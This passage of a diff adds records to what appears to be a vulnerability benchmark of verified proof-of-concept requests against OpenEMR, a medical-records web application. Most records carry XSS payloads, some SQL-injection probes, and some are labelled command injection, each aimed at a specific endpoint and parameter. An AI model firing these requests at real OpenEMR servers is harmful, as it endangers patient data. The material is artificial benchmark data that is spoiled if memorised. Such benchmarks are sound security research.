+    "method": "POST",
+    "path": "/interface/orders/pending_orders.php",
+    "post_data": {
+      "csrf_token_form": [
+        "8d2a9b8f3d27853dfb774dddda96540fbcb01232"
+      ],
+      "form_facility": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_refresh": [
+        ""
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a7503cff",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_5b1b72",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/rules/patient_data.php",
+    "post_data": {},
+    "query_params": {
+      "category": [
+        "act_cat_assess"
+      ],
+      "item": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.67e96a7b25950",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_5d9e08",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "framewidth": [
+        "755"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_username[]": [
+        "xuefeng20011024"
+      ],
+      "viewtype": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.67e96a690e7e3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_5e8fab",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/reminder/patient_reminders.php",
+    "post_data": {},
+    "query_params": {
+      "mode": [
+        "admin"
+      ],
+      "patient_id": [
+        ""
+      ],
+      "sortby": [
+        "category, item"
+      ],
+      "sortorder": [
+        "'"
+      ]
+    },
+    "request_id": "requests.67e96a7696b00",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_6a8c6c",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/super/load_codes.php",
+    "post_data": {
+      "FILEUPLOAD": [
+        "jaekpot.jpg"
+      ],
+      "MAX_FILE_SIZE": [
+        "350000000"
+      ],
+      "bn_upload": [
+        "Upload and Install"
+      ],
+      "csrf_token_form": [
+        "8d2a9b8f3d27853dfb774dddda96540fbcb01232"
+      ],
+      "form_code_type": [
+        "\"%20onmouseover=prompt(987890)%20\""
+      ],
+      "form_replace": [
+        "1"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a70c2a60",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_6b7b62",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/reminder/patient_reminders.php",
+    "post_data": {},
+    "query_params": {
+      "mode": [
+        "simple"
+      ],
+      "patient_id": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "sortby": [
+        "lname, fname"
+      ],
+      "sortorder": [
+        "asc"
+      ]
+    },
+    "request_id": "requests.67e96a6b6d159",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_6bbfb7",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "": [
+        "on",
+        "on",
+        ""
+      ],
+      "begin": [
+        "'"
+      ],
+      "form_active": [
+        "1"
+      ],
+      "showall": [
+        "no"
+      ],
+      "sortby": [
+        "pnotes.date"
+      ],
+      "sortorder": [
+        "desc"
+      ],
+      "task": [
+        "delete"
+      ]
+    },
+    "query_params": {
+      "begin": [
+        "0"
+      ],
+      "form_active": [
+        "1"
+      ],
+      "showall": [
+        "no"
+      ],
+      "sortby": [
+        "pnotes.date"
+      ],
+      "sortorder": [
+        "desc"
+      ]
+    },
+    "request_id": "requests.681b6e841fda0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_6f2a24",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/reports/pat_ledger.php",
+    "post_data": {},
+    "query_params": {
+      "form": [
+        "1"
+      ],
+      "patient_id": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "request_id": "requests.67e96a6ccc3fa",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_70af8a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/main_screen.php",
+    "post_data": {
+      "authProvider": [
+        "Default"
+      ],
+      "authUser": [
+        "xuefeng20011024"
+      ],
+      "clearPass": [
+        "xuefeng20011024"
+      ],
+      "languageChoice": [
+        "sqli%27"
+      ],
+      "new_login_session_management": [
+        "1"
+      ]
+    },
+    "query_params": {
+      "auth": [
+        "login"
+      ],
+      "site": [
+        "default"
+      ]
+    },
+    "request_id": "requests.682c75ab72959",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_727511",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/super/rules/index.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "\""
+      ]
+    },
+    "request_id": "requests.67e96a8b96da3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_762bca",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/procedure_stats.php",
+    "post_data": {
+      "csrf_token_form": [
+        "467b9ccfd25ca6bbddf794feeaedc86cdc0928f9"
+      ],
+      "form_by": [
+        "`"
+      ],
+      "form_facility": [
+        "<script>xss(10453807)</script>"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_output": [
+        "<script>xss(46412434)</script>"
+      ],
+      "form_sexes": [
+        "<script>xss(96277608)</script>"
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a8f9e122",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_7968d0",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/main_screen.php",
+    "post_data": {
+      "authProvider": [
+        "Default"
+      ],
+      "authUser": [
+        "xuefeng20011024"
+      ],
+      "clearPass": [
+        "xuefeng20011024"
+      ],
+      "languageChoice": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "new_login_session_management": [
+        "1"
+      ]
+    },
+    "query_params": {
+      "auth": [
+        "login"
+      ],
+      "site": [
+        "default"
+      ]
+    },
+    "request_id": "requests.67e96a867a3a2",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_7a09d3",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/reminder/patient_reminders.php",
+    "post_data": {},
+    "query_params": {
+      "mode": [
+        "simple"
+      ],
+      "patient_id": [
+        ""
+      ],
+      "sortby": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "sortorder": [
+        "asc"
+      ]
+    },
+    "request_id": "requests.67e96a824cffd",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_7eb97c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/reports/pat_ledger.php",
+    "post_data": {},
+    "query_params": {
+      "form": [
+        "1"
+      ],
+      "patient_id": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.67e96a6ccc3fa",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_82f12a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/main_screen.php",
+    "post_data": {
+      "authProvider": [
+        "Default"
+      ],
+      "authUser": [
+        "\""
+      ],
+      "clearPass": [
+        "ZAP"
+      ],
+      "languageChoice": [
+        "3-2"
+      ],
+      "new_login_session_management": [
+        "1"
+      ]
+    },
+    "query_params": {
+      "auth": [
+        "login"
+      ],
+      "site": [
+        "default"
+      ]
+    },
+    "request_id": "requests.6819ca177d6c1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_8940bf",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "func": [
+        "view"
+      ],
+      "jumpdate": [
+        ""
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "query_params": {
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ]
+    },
+    "request_id": "requests.682c75aea47b9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_8a9a4d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/custom/chart_tracker.php",
+    "post_data": {
+      "csrf_token_form": [
+        "8d2a9b8f3d27853dfb774dddda96540fbcb01232"
+      ],
+      "form_lookup": [
+        ""
+      ],
+      "form_newid": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a69b142f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_8da650",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/reports/pat_ledger.php",
+    "post_data": {},
+    "query_params": {
+      "form": [
+        "1"
+      ],
+      "patient_id": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "request_id": "requests.67e96a6ccc3fa",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_8e5689",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/list_reports.php",
+    "post_data": {
+      "form_external_refresh": [
+        ""
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_patient": [
+        "1"
+      ],
+      "form_provider": [
+        ""
+      ],
+      "form_refresh": [
+        "Submit"
+      ],
+      "form_reviewed": [
+        "1"
+      ],
+      "form_to_date": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a6db3dca",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_93d146",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "func": [
+        "view"
+      ],
+      "jumpdate": [
+        ""
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "query_params": {
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ]
+    },
+    "request_id": "requests.681b6e8750398",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_9490d3",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "form_facility": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_patient_id": [
+        "</title></option><script>xss(18506844)</script>"
+      ],
+      "form_patient_name": [
+        "</title></option><script>xss(23023674)</script>"
+      ],
+      "form_provider": [
+        ""
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ],
+      "go": [
+        "Recalls"
+      ]
+    },
+    "query_params": {
+      "go": [
+        "Recalls"
+      ]
+    },
+    "request_id": "requests.67e96a6d8be64",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_9c360d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/super/rules/index.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "\""
+      ]
+    },
+    "request_id": "requests.67e96a8b96da3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_a2e27d",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "framewidth": [
+        "1600"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_username[]": [
+        "xuefeng20011024"
+      ],
+      "viewtype": [
+        "javascript:alert(987890)"
+      ]
+    },
+    "request_id": "requests.682c75abc2a5d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_a3881e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/usergroup/facility_admin.php",
+    "post_data": {},
+    "query_params": {
+      "fid": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.67e96a6e809f8",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_a659f0",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/procedure_stats.php",
+    "post_data": {
+      "csrf_token_form": [
+        "467b9ccfd25ca6bbddf794feeaedc86cdc0928f9"
+      ],
+      "form_by": [
+        "\"'><script>xss(32270077)</script>"
+      ],
+      "form_facility": [
+        "\"'><script>xss(6829106)</script>"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_output": [
+        "\"'><script>xss(59974529)</script>"
+      ],
+      "form_sexes": [
+        "\"'><script>xss(2020399)</script>"
+      ],
+      "form_submit": [
+        "Submit"
+      ],
+      "form_to_date": [
+        "\""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a708f923",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_a7420c",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/summary/pnotes_full.php",
+    "post_data": {},
+    "query_params": {
+      "form_active": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.67e96a6e3c963",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_a7b733",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/onotes/office_comments_full.php",
+    "post_data": {
+      "active": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "csrf_token_form": [
+        "8d2a9b8f3d27853dfb774dddda96540fbcb01232"
+      ],
+      "mode": [
+        "new"
+      ],
+      "note": [
+        "<script>xss(23601184)</script>"
+      ],
+      "offset": [
+        "0"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a70c9de3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_a816f3",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/pending_orders.php",
+    "post_data": {
+      "csrf_token_form": [
+        "8d2a9b8f3d27853dfb774dddda96540fbcb01232"
+      ],
+      "form_facility": [
+        "sqli%2527"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_refresh": [
+        ""
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a7503cff",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_a9499a",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/super/rules/index.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.67e96a8b96da3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_b1df59",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "form_facility": [
+        ""
+      ],
+      "form_from_date": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "form_patient_id": [
+        "xuefeng20011024"
+      ],
+      "form_patient_name": [
+        "xuefeng20011024"
+      ],
+      "form_provider": [
+        ""
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ],
+      "go": [
+        "Recalls"
+      ]
+    },
+    "query_params": {
+      "go": [
+        "Recalls"
+      ]
+    },
+    "request_id": "requests.67e96a75b96b8",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_b43f9c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "framewidth": [
+        "1337"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_username": [
+        "sqli%2527"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "request_id": "requests.67e96a83c902e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_b8ad7d",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "Date": [
+        "20250331"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "pc_username[0]": [
+        "xuefeng20011024"
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ]
+    },
+    "request_id": "requests.67e96a7f4a3f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_b93394",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "form_facility": [
+        "`"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_patient_id": [
+        "</title></option><script>xss(18506844)</script>"
+      ],
+      "form_patient_name": [
+        "</title></option><script>xss(23023674)</script>"
+      ],
+      "form_provider": [
+        ""
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ],
+      "go": [
+        "Recalls"
+      ]
+    },
+    "query_params": {
+      "go": [
+        "Recalls"
+      ]
+    },
+    "request_id": "requests.67e96a6d8be64",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_bafa09",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/reports/pat_ledger.php",
+    "post_data": {},
+    "query_params": {
+      "form": [
+        "1"
+      ],
+      "patient_id": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.67e96a6ccc3fa",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_bfb399",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "framewidth": [
+        "1600"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_username[]": [
+        "xuefeng20011024"
+      ],
+      "viewtype": [
